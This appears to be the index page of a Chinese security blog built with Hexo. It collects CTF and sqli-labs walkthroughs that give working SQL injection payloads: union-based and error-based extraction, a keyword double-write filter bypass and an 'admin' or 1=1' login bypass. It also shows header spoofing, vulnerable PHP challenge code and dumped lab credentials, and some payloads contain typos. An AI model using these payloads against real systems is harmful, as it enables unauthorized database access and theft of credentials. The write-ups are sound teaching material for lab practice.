@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="Life isn&#39;t about waiting for the storm to pass. It&#39;s about learning to dance in the rain">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="Reteja">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="Rejeta&#39;s Blog"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="Life isn&#39;t about waiting for the storm to pass. It&#39;s about learning to dance in the rain" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="Rejeta&#39;s Blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="website" />
+    
+
+    <!--Page Cover-->
+    
+
+    
+        <meta name="twitter:card" content="summary" />
+    
+    
+    
+
+    <!-- Title -->
+    
+    <title>page - Rejeta&#39;s Blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    <!-- Google Analytics -->
+    
+
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about.html">
+                    About
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    Categories
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact.html">
+                    Contact
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+            <h1 id="main-title" class="title">Rejeta's Blog</h1>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20babysql/">
+                Untitled
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2020-11-18</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="极客大挑战-babysql"><a href="#极客大挑战-babysql" class="headerlink" title="极客大挑战 babysql"></a>极客大挑战 babysql</h1><p>启动靶机，进入题目。很明显的sql注入，因为题目已经提示了，那么就先找注入点。<br>类似于之前的easysql，先尝试username的地方是否有注入，发现只要注释掉了后面的password，那么网页会报错，只能在password的地方进行注入<br>首先，尝试通用的语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: http:&#x2F;&#x2F; ******&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;1&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+<p>但是返回了一个数据库报错，报错显示，能到达数据库被识别的语句部分只有1,2,3<br>看来是对union select等词语进行了过滤，直接变成了空白字符<br>尝试双写绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: http:&#x2F;&#x2F; ******&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;1&#39; ununionion selselectect 1,2,3 --+</span><br></pre></td></tr></table></figure>
+
+<p>OK,页面成功返回，那就说明双写是有效的，接下来就是正常操作了，只不过多加了一个双写<br>查询数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: http:&#x2F;&#x2F;******&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;1&#39; ununionion selselectect 1,2,group_cat(schema_name) frfromom infoorrmation_schema.schemata --+</span><br></pre></td></tr></table></figure>
+
+<p>查询数据表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: http:&#x2F;&#x2F;******&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;1&#39; ununionion selselectect 1,2,group_cat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema Ddatabase() --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://diviad-nick.github.io/image/jkdtz_babysql_1.png"><br>查询字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: http:&#x2F;&#x2F;******&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;1&#39; ununionion selselectect 1,2,group_cat(column_name) frfromom infoorrmation_schema.columns whewherere table_schema Ddatabase() anandd table_name&#x3D;&#39;b4bsql&#39;--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://diviad-nick.github.io/image/jkdtz_babysql_2.png"><br>查询flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: http:&#x2F;&#x2F;******&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;1&#39; ununionion selselectect 1,2,group_cat(password) frfromom b4bsql --+</span><br></pre></td></tr></table></figure>
+<p>拿到flag<br><img src="https://diviad-nick.github.io/image/jkdtz_babysql_3.png"></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20easysql/">
+                Untitled
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2020-11-18</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="极客大挑战-easySQL"><a href="#极客大挑战-easySQL" class="headerlink" title="极客大挑战 easySQL"></a>极客大挑战 easySQL</h1><p>打开连接，看到一个登陆界面，日常操作如下：<br>1.右键查看源代码，找找可以用的信息。<br>2.御剑扫描后台，看看有没有可以访问的界面<br>3.既然是SQL，那就看看是否存在sql注入（sqlmap）</p>
+<p>经过探测，发现：<br>1.网页通过get的方式传参，可以构造url<br>2.没有其他可以访问的界面<br>3.存在SQL注入</p>
+<p>既然是SQL注入，首先尝试万能密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:admin&#39; or 1&#x3D;1 #</span><br></pre></td></tr></table></figure>
+<p>直接拿到了flag。。。<br><font color=#00f size=3><br>原理：当我们的密码和用户名被代入数据库中查询，用户名admin的情况下，密码admin如果错误，则1=1，但是1=1是永真的，所以可以直接登录进去。<br></font></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20havefun/">
+                Untitled
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2020-11-18</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>#极客大挑战 have fun<br>打开界面是一只猫，随意的点击两下，没发现登录框或者其他交互界面<br>直接右键查看源代码，前面都是一些没什么有用的信息，滑到最下面，发现关键代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">        $cat&#x3D;$_GET[&#39;cat&#39;];</span><br><span class="line">        echo $cat;</span><br><span class="line">        if($cat&#x3D;&#x3D;&#39;dog&#39;)&#123;</span><br><span class="line">            echo &#39;Syc&#123;cat_cat_cat_cat&#125;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        --&gt;</span><br></pre></td></tr></table></figure>
+<p>也就是说，我们用get形式传参，让变量cat的值为dog，就能拿到flag<br>构造url：http://****/index.php?cat=dog<br>拿到flag</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20https/">
+                Untitled
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2020-11-18</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="极客大挑战-https"><a href="#极客大挑战-https" class="headerlink" title="极客大挑战 https"></a>极客大挑战 https</h1><p>打开链接，进入界面，发现只是一个简单的界面，开头的英文表示这是一个私密的网站，后面就是介绍一个黑客组织的简短的文字。<br><img src="https://diviad-nick.github.io/image/jkdtz_https_1.png"><br>抓包看看<br><img src="https://diviad-nick.github.io/image/jkdtz_https_2.png"><br>在数据包中发现了一个“Secret.php”的网址，访问一下<br><img src="https://diviad-nick.github.io/image/jkdtz_https_3.png"><br>提示很明显了，让我们从<a target="_blank" rel="noopener" href="http://www.sycsecret.com访问,那就抓包,构造referer头/">www.Sycsecret.com访问，那就抓包，构造referer头</a><br>然后提示说要用 Syclover “ browser浏览器，所以直接改user-agent就行<br>然后又要本地ip访问，那就构造一个X-Forward-For来伪造ip地址<br>成功拿到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">GET &#x2F;Secret.php HTTP&#x2F;1.1</span><br><span class="line">Host: node3.buuoj.cn:28831</span><br><span class="line">User-Agent: Syclover &quot; browser</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Referer: https:&#x2F;&#x2F;www.Sycsecret.com</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2020/11/18/easyphp/">
+                Untitled
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2020-11-18</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="我fork出来进程怎么可能会异常退出。"><a href="#我fork出来进程怎么可能会异常退出。" class="headerlink" title="我fork出来进程怎么可能会异常退出。"></a>我fork出来进程怎么可能会异常退出。</h1><?php
+    //题目环境：php:7.4.8-apache
+    $pid = pcntl_fork();        //建立子进程
+    if ($pid == -1) {           //进程建立失败，杀死进程，返回
+        die('could not fork');
+    }else if ($pid){            //进程建立成功
+        $r=pcntl_wait($status);     //返回进程的状态代码
+        if(!pcntl_wifexited($status)){      //检查进程代码是否属于正常退出
+            phpinfo();                      //输出phpinfo();
+        }
+    }else{
+        highlight_file(__FILE__);           //高亮显示
+        if(isset($_GET['a']) //是否存在变量
+           &&is_string($_GET['a']) //变量是否是字符串
+           &&!preg_match("/[:\\\\]|exec|pcntl/i",$_GET['a']))  //正则匹配，匹配变量中是否存在以上字符
+        {
+            call_user_func_array($_GET['a'],[$_GET['b'],false,true]); //回调函数，后回调给前
+        }
+        posix_kill(posix_getpid(), SIGUSR1); //结束进程
+    } 
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2020/11/18/sql-labs%20%E9%80%9A%E5%85%B3%EF%BC%88sql-5%EF%BC%89/">
+                Untitled
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2020-11-18</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="sql-labs-通关攻略（sql-5）"><a href="#sql-labs-通关攻略（sql-5）" class="headerlink" title="sql-labs 通关攻略（sql-5）"></a>sql-labs 通关攻略（sql-5）</h1><p>进入网站，可以看到和往常的注入网页一样，基本没有什么特殊的返回，但是经过探测发现，网页的回显都是错误，没有正确显示，那我们就可以使用特殊的注入的方式——————双查询注入（报错注入）【结尾处有介绍】<br>首先我们要探测出数据库，于是使用下面的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.23.130&#x2F;sqli&#x2F;sqlilabs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select null,count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a%23</span><br></pre></td></tr></table></figure>
+<p>图1<br>接下来要找到数据库中使用的表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.23.130&#x2F;sqli&#x2F;sqlilabs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select null,count(*),concat((select table_name from information_schema.schemata where table_schema &#x3D; &#39;security&#39;),floor(rand()*2)) as a from information_schema.tables group by a%23</span><br></pre></td></tr></table></figure>
+<p>但是这种输入方式存在问题，这样返回的结果是超过一行了，我们稍微改进一下，使用limit函数来限制输出，就能拿到我们想要的结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.23.130&#x2F;sqli&#x2F;sqlilabs&#x2F;Less-5&#x2F;?id&#x3D;1%27%20union%20select%20null,count(*),concat((select%20table_name%20from%20information_schema.tables%20where%20table_schema&#x3D;%27security%27%20limit%203,1),floor(rand()*2))as%20a%20from%20information_schema.tables%20group%20by%20a%23</span><br></pre></td></tr></table></figure>
+<p>注：以上命令中的百分号加数字是url编码的符号表示，百度就可以知道具体意义<br>接下来就是寻找具有实际价值的数据库字段。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[select%20column_name%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27%20limit%207,1](http:&#x2F;&#x2F;192.168.23.130&#x2F;sqli&#x2F;sqlilabs&#x2F;Less-5&#x2F;?id&#x3D;1%27%20union%20select%20null,count(*),concat((select%20column_name%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27%20limit%207,1),floor(rand()*2))as%20a%20from%20information_schema.tables%20group%20by%20a%23)</span><br></pre></td></tr></table></figure>
+<p>上面的命令有时候会卡错，多刷新就可以了。<br>拿到字段中的内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.23.130&#x2F;sqli&#x2F;sqlilabs&#x2F;Less-5&#x2F;?id&#x3D;1%27%20union%20select%20null,count(*),concat((select%20column_name%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27%20limit%207,1),floor(rand()*2))as%20a%20from%20information_schema.tables%20group%20by%20a%23</span><br></pre></td></tr></table></figure>
+<p>ok，现在已经拿到了我们想要的数据了，本关通过</p>
+<font color=#fff0000 size=3>
+注:双查询注入
+
+<p>双查询注入又称为报错注入，是在正常注入无法进行的情况下进行的注入方式。当我们通过正常的注入方式无法拿到回显，而且被大量过滤各种字符的时候，就可以尝试使用报错注入</p>
+<p>原理：在程序的报错注入的界面中，程序获取参数之后，将参数拼接到语句中，带入数据库查询。如果执行成功，就输出成功，就输出正确，如果执行错误，那就将错误信息输出到界面上（通过函数mysqli_error($con) 实现错误信息的输出）利用这种错误回显，就可以通过floor()，updatexml()等函数将要查询的内容输出到页面上</p>
+</font>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2020/11/18/sql-labs%E9%80%9A%E5%85%B3(sql-1)/">
+                Untitled
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2020-11-18</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="SQL-Labs通关教程-sql-1"><a href="#SQL-Labs通关教程-sql-1" class="headerlink" title="SQL-Labs通关教程(sql-1)"></a>SQL-Labs通关教程(sql-1)</h1><p>靶场搭建：下载phpstudy软件（在官网下载），安装到windows虚拟机上，打开软件，启动Apache服务和mysql服务。将sqllabs的靶场文件解压到C盘的phpstudy文件夹下面的WWW文件夹，然后使用cmd命令ipconfig查看虚拟机ip，就可以用物理机或者另一个虚拟机来访问靶场了，最好关闭防火墙。</p>
+<p>第一关：<br>先使用探测手段来看是否有注入点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">数字型：http:&#x2F;&#x2F;192.168.23.130&#x2F;Sqli_Edited_Version-master&#x2F;sqlilabs&#x2F;Less-1&#x2F;index.php?id&#x3D;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">字符型：http:&#x2F;&#x2F;192.168.23.130&#x2F;Sqli_Edited_Version-master&#x2F;sqlilabs&#x2F;Less-1&#x2F;index.php?id&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
+<p>发现字符型的输入报错，接下来两个输入对比 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.http:&#x2F;&#x2F;192.168.23.130&#x2F;Sqli_Edited_Version-master&#x2F;sqlilabs&#x2F;Less-1&#x2F;index.php?id&#x3D;1&#39; and 1&#x3D;1--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.http:&#x2F;&#x2F;192.168.23.130&#x2F;Sqli_Edited_Version-master&#x2F;sqlilabs&#x2F;Less-1&#x2F;index.php?id&#x3D;1&#39; and 1&#x3D;2--+</span><br></pre></td></tr></table></figure>
+<p>对比之后发现第一条正常输入，第二条是非正常输入，这说明存在sql注入，我们可以通过构造and后面的语句来查询我们想要查询到的东西（–+是sql语句中的注释符号）<br>接下来查字段，看看在哪个字段上，sql语句是有效的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.23.130&#x2F;Sqli_Edited_Version-master&#x2F;sqlilabs&#x2F;Less-1&#x2F;index.php?id&#x3D;1&#39; order by 3--+</span><br></pre></td></tr></table></figure>
+<p>使用order by语句查询之后之后发现，字段是3。（order by 后面的数字是可以自己修改的），从order by开始，后面的查询语句不需要and语句在中间进行连接，我们需要得到的信息只需要构造语句就行了。</p>
+<p>接下来查看当前数据库名称</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.23.130&#x2F;Sqli_Edited_Version-master&#x2F;sqlilabs&#x2F;Less-1&#x2F;index.php?id&#x3D;%27%20union%20select%201,2,database()%20--+</span><br></pre></td></tr></table></figure>
+<p>使用查询语句union select 1,2,database()查询到当前使用的数据库的名称叫做Security，接下来查询全部数据库的名称</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.23.130&#x2F;Sqli_Edited_Version-master&#x2F;sqlilabs&#x2F;Less-1&#x2F;index.php?id&#x3D;%27%20union select 1,2,(select%20group_concat(schema_name)%20from%20information_schema.schemata) --+</span><br></pre></td></tr></table></figure>
+<p>上面这条语句中，有两个点需要说明，首先是sql语句中的函数group_concat()，这个函数的使用方式就是select group_concat(name) from aa；该函数在连接查询的时候，能让查出的这字段的多个数，按字符拼接的方式存放在一起。 第二点就是查询的列叫做schema_name，sql中有一个概念叫做模式，schema就是sql中的模式，模式中包含了schema对象，可以是表(table)、列(column)、数据类型(data type)、视图(view)、存储过程(stored procedures)、关系(relationships)、主键(primary key)、外键(foreign key)等</p>
+<p>查到的数据库名称有information_schema,challenges,mysql,performance_schema,security,sys,test1，接下来我们查询表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.23.130&#x2F;Sqli_Edited_Version-master&#x2F;sqlilabs&#x2F;Less-1&#x2F;index.php?id&#x3D;%27%20union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; 0x7365637572697479 and table_name&#x3D;0x7573657273) --+</span><br></pre></td></tr></table></figure>
+<p>查询表名的时候，我们发现，使用group_cat()函数指定数据库的时候，使用查询出来的数据库名称是行不通的，所以这里转换成16进制查询，拿到表名id,username,password，接下来就是查询字段了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.23.130&#x2F;Sqli_Edited_Version-master&#x2F;sqlilabs&#x2F;Less-1&#x2F;index.php?id&#x3D;%27%20union select 1,2,(select%20group_concat(username,0x3a,password)%20from%20users)--+</span><br></pre></td></tr></table></figure>
+<p>成功爆出字段usernamepassword字段名   0x3a： 0x是十六进制标志，3a是十进制的58，是ascii中的 ‘:’ ，用以分割pasword和username</p>
+<p>Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4,admin5:admin5 </p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2020/11/18/sql-labs%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5%EF%BC%88sql-11%EF%BC%89/">
+                Untitled
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2020-11-18</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="sql——labs通关攻略（sql-11）"><a href="#sql——labs通关攻略（sql-11）" class="headerlink" title="sql——labs通关攻略（sql-11）"></a>sql——labs通关攻略（sql-11）</h1><p>首先打开界面就是和其他关卡不太一样，能够明显看到输入框，也就是说，这道题不能通过url的方式来注入。既然是输入框，那就在输入框中尝试以下注入代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and 1&#x3D;1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and 1&#x3D;2</span><br></pre></td></tr></table></figure>
+<p>在username 和password中都尝试一下，就会发现，password中输入的代码是有错误回显的，这就说明，password中有注入点（注意，输入的代码后面的#号可以正常输入，不需要转换url编码）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; union select null,database()#</span><br></pre></td></tr></table></figure>
+<p>接下来是正常的注入操作，表名称：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; union select null,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; &#39;security&#39;)#</span><br></pre></td></tr></table></figure>
+<p>然后是字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; union select null,(select group_concat(colunm_name) from information_schema.columns where table_name &#x3D; &#39;users&#39;)#</span><br></pre></td></tr></table></figure>
+<p>最后是字段中的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; union select null,(select group_concat(username,password) from users)#</span><br></pre></td></tr></table></figure>
+<p>本关完成</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2020/11/18/sql-labs%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5%EF%BC%88sql-12%EF%BC%89/">
+                Untitled
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2020-11-18</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="sql——labs通关攻略（sql-12）"><a href="#sql——labs通关攻略（sql-12）" class="headerlink" title="sql——labs通关攻略（sql-12）"></a>sql——labs通关攻略（sql-12）</h1><p>打开界面就和11关不一样，使用平常的测试代码，界面没有错误回显，判断是由于闭合错误导致的，于是尝试使用双引号闭合，在username下成功看到报错，通过报错可推断闭合还要加上括号，于是尝试下面的探测</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;) and 1&#x3D;1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;) and 1&#x3D;2</span><br></pre></td></tr></table></figure>
+<p>在username 中都能得到对应的结果，接下来就是正常的注入过程<br>数据库：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;) union select null,database()#</span><br></pre></td></tr></table></figure>
+<p>接下来是正常的注入操作，表名称：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;) union select null,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; &#39;security&#39;)#</span><br></pre></td></tr></table></figure>
+<p>然后是字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;) union select null,(select group_concat(colunm_name) from information_schema.columns where table_name &#x3D; &#39;users&#39;)#</span><br></pre></td></tr></table></figure>
+<p>最后是字段中的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;) union select null,(select group_concat(username,password) from users)#</span><br></pre></td></tr></table></figure>
+<p>本关完成</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2020/11/18/sql-labs%E9%80%9A%E5%85%B3%EF%BC%88sql-2%EF%BC%89/">
+                Untitled
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2020-11-18</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="sql-labs通关（sql-2）"><a href="#sql-labs通关（sql-2）" class="headerlink" title="sql-labs通关（sql-2）"></a>sql-labs通关（sql-2）</h1><p>首先测试sql漏洞类型，发现是数字型注入，因为在如下语句下，回显是正常的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.23.130&#x2F;Sqli_Edited_Version-master&#x2F;sqlilabs&#x2F;Less-2&#x2F;?id&#x3D;1 and 1&#x3D;1</span><br></pre></td></tr></table></figure>
+<p>接下来查询字段，还是老方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.23.130&#x2F;Sqli_Edited_Version-master&#x2F;sqlilabs&#x2F;Less-2&#x2F;?id&#x3D;1 order by 1,2,3 --+</span><br></pre></td></tr></table></figure>
